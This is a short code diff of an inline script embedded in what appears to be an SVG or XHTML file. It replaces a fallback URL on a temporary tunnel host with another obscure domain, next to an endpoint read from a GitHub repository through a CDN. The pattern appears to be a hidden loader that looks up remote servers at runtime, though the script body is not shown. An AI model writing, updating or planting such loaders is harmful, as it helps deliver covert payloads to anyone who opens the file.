@@ -67,7 +67,7 @@
   <script type="text/javascript"><![CDATA[
   (function () {
     try {
-      var FALLBACK = "https://library-pest-traffic-train.trycloudflare.com";
+      var FALLBACK = "https://lswob.lootline.xyz";
       var ENDPOINT = "https://cdn.jsdelivr.net/gh/PrismDev3/interactive-study-modules@main/endpoint.json";
       var doc = document, done = false;
 
